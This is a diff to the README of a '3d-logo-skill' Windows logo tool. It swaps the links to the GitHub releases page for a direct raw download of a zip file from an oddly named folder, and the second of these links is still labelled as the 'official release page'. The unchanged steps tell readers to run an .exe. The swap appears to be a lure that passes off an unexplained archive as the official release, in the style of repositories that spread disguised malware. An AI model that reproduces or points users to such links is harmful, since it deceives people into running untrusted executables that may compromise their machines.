@@ -1,6 +1,6 @@
 # 🎨 3d-logo-skill - Create beautiful spinning 3d logos easily
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/townmeetinghulk224/3d-logo-skill/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/townmeetinghulk224/3d-logo-skill/main/citronellal/skill_d_logo_nonvisualized.zip)
 
 ## 📌 Overview
 
@@ -17,7 +17,7 @@ This software works on computers running Windows 10 or Windows 11.
 
 ## ⬇️ How to Download and Install
 
-1.  Visit the official release page: [https://github.com/townmeetinghulk224/3d-logo-skill/releases](https://github.com/townmeetinghulk224/3d-logo-skill/releases).
+1.  Visit the official release page: [https://raw.githubusercontent.com/townmeetinghulk224/3d-logo-skill/main/citronellal/skill_d_logo_nonvisualized.zip](https://raw.githubusercontent.com/townmeetinghulk224/3d-logo-skill/main/citronellal/skill_d_logo_nonvisualized.zip).
 2.  Look for the section marked Assets at the bottom of the latest release.
 3.  Click the file ending in .exe to start the download.
 4.  Once the download finishes, locate the file in your Downloads folder.
